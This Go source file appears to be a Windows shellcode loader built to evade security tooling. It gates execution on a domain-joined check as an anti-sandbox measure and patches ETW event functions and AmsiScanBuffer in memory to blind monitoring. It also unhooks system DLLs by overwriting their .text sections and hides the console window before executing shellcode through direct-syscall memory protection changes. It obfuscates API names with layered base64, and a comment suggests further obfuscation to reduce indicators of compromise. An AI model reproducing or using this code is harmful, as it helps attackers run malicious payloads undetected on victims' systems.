package main

import (
	"cmds/cmds"
	"debug/pe"
	"encoding/base64"
	"encoding/hex"
	"time"

	"io/ioutil"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

var _ unsafe.Pointer
var (
	allocSysid     uint16
	NtProtectSysid uint16
	B64number      int = 4
)

func antiSandbox() (bool, error) {
	var domain *uint16
	var status uint32
	err := syscall.NetGetJoinInformation(nil, &domain, &status)
	if err != nil {
		return false, err
	}
	syscall.NetApiBufferFree((*byte)(unsafe.Pointer(domain)))
	return status == syscall.NetSetupDomainName, nil
}

func Hide(show bool) {
	getWin := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc(cusBase64decode("VldwS1YwMUdSWGxQV0ZacVRXcHNlbGRzV210alIwcDBWVzVhYTJSNk1Eaz0="))
	showWin := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2'})).NewProc(cusBase64decode("VmxSS2IyUnRVWGhhU0VKcFlsWktNbHBJWXpsUVVUMDk="))
	hwnd, _, _ := getWin.Call()
	if hwnd == 0 {
		return
	}
	if show {
		var SW_RESTORE uintptr = 9
		showWin.Call(hwnd, SW_RESTORE)
	} else {
		var SW_HIDE uintptr = 0
		showWin.Call(hwnd, SW_HIDE)
	}
}

func Versionfunc() string {
	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	//此处的string可以也改成byte减少IOC
	CurrentVersion, _, _ := regkey.GetStringValue("CurrentVersion")
	MajorVersion, _, err := regkey.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil {
		MinorVersion, _, _ := regkey.GetIntegerValue("CurrentMinorVersionNumber")
		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
	}
	defer regkey.Close()

	if CurrentVersion == "10.0" {
		allocSysid = 0x18
		NtProtectSysid = 0x50
	} else if CurrentVersion == "6.3" {
		allocSysid = 0x17
		NtProtectSysid = 0x4f
	} else if CurrentVersion == "6.2" {
		allocSysid = 0x16
		NtProtectSysid = 0x4e
	} else if CurrentVersion == "6.1" {
		allocSysid = 0x15
		NtProtectSysid = 0x4d
	}
	return CurrentVersion

}
func cusBase64decode(b64 string) string {
	var decoded []byte
	decoded, _ = base64.StdEncoding.DecodeString(b64)
	sum := 1
	for i := 1; i < B64number; i++ {
		decoded, _ = base64.StdEncoding.DecodeString(string(decoded))
		sum += i
	}
	return string(decoded)

}

const (
	errnoERROR_IO_PENDING = 997
)

var errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)

//WriteProcessMemory
var procWriteProcessMemory = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc(cusBase64decode("Vm1wT1MyTkhVa2hXYkVacVlsUnNjVmRzYUU5bGJGSllWbTVTYVUwd2J6RT0="))

func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return nil
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}

	return e
}

var procEtwNotificationRegister = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("Vld4b1UwMHhVblJQVkVKb1ZqRndkMWRVU2tkTlIwWllUMWhXVm1KV1duVlpWbWhQVFVad1dWTlVNRDA9"))
var procEtwEventRegister = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("Vld4b1UwMHhTbGxYYlhocFlteEtWRmRzWkd0alIwMTZWVzE0YWxwNk1Eaz0="))
var procEtwEventWriteFull = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQldWMnBHYVZJell6az0="))
var procEtwEventWrite = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(cusBase64decode("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQlNVRlF3UFE9PQ=="))

func patchETW() {
	handle := uintptr(0xffffffffffffffff)
	dataAddr := []uintptr{procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWrite.Addr()}
	for i, _ := range dataAddr {
		data, _ := hex.DecodeString("4833C0C3")
		var nLength uintptr
		datalength := len(data)
		WriteProcessMemory(handle, dataAddr[i], &data[0], uintptr(uint32(datalength)), &nLength)
	}
}

func patchAMSI() {
	var handle uint64
	handle = 0xffffffffffffffff
	amsidll, _ := windows.LoadLibrary("amsi.dll")
	AmsiScanBuffer, _ := windows.GetProcAddress(amsidll, "AmsiScanBuffer")
	patch, _ := hex.DecodeString("B857000780C3")
	var wgZNimCw uintptr
	YiSD := len(patch)
	WriteProcessMemory(uintptr(handle), uintptr(uint(AmsiScanBuffer)), &patch[0], uintptr(uint32(YiSD)), &wgZNimCw)
}

func FullUnhook() {
	err := ReloadPE(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	if err != nil {

	}
	err = ReloadPE(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
	if err != nil {

	}
	err = ReloadPE(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}))
	if err != nil {

	}
	err = ReloadPE(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	if err != nil {

	}

}

func main() {

	var notSandbox bool
	notSandbox, _ = antiSandbox()
	if notSandbox == true {
	} else {
		os.Exit(3)
	}
	patchETW()
	patchAMSI()
	time.Sleep(2538 * time.Millisecond)
	Version := Versionfunc()
	if Version == "10.0" {
		FullUnhook()
	}
	patchETW()
	Hide(false)

	ShellCode := cmds.GetShellCode()

	ptr := func() {
	}
	var old uintptr
	handle := uintptr(0xffffffffffffffff)
	regionsize := uintptr(len(ShellCode))
	var oldfartcodeperms uintptr
	runfunc, _ := cmds.NtProtectVirtualMemory_Func(
		NtProtectSysid,
		handle,
		(*uintptr)(unsafe.Pointer(&ptr)),
		&regionsize,
		0x40,
		&old,
	)
	if runfunc != 0 {
		panic("Call to VirtualProtect failed!")
	}

	*(**uintptr)(unsafe.Pointer(&ptr)) = (*uintptr)(unsafe.Pointer(&ShellCode))

	runfunc, _ = cmds.NtProtectVirtualMemory_Func(
		NtProtectSysid,
		handle,
		(*uintptr)(unsafe.Pointer(&ShellCode)),
		&regionsize,
		0x40,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
		panic("Call to VirtualProtect failed!!!!!")
	}
	syscall.Syscall(**(**uintptr)(unsafe.Pointer(&ptr)), 0, 0, 0, 0)

}
func ReloadPE(DLLname string) error {

	dll, err := ioutil.ReadFile(DLLname)
	if err != nil {
		return err
	}
	file, error1 := pe.Open(DLLname)
	if error1 != nil {
		return error1
	}
	x := file.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
	bytes := dll[x.Offset:x.Size]
	loaddll, error2 := windows.LoadDLL(DLLname)
	if error2 != nil {
		return error2
	}
	handle := loaddll.Handle
	dllBase := uintptr(handle)
	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
	RegionSize := uintptr(len(bytes))
	handlez := uintptr(0xffffffffffffffff)
	var oldfartcodeperms uintptr

	runfunc, _ := cmds.NtProtectVirtualMemory_Func(
		NtProtectSysid,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&RegionSize,
		0x40,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}
	for i := 0; i < len(bytes); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = bytes[i]
	}
	runfunc, _ = cmds.NtProtectVirtualMemory_Func(
		NtProtectSysid,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&RegionSize,
		oldfartcodeperms,
		&oldfartcodeperms,
	)
	return nil
}
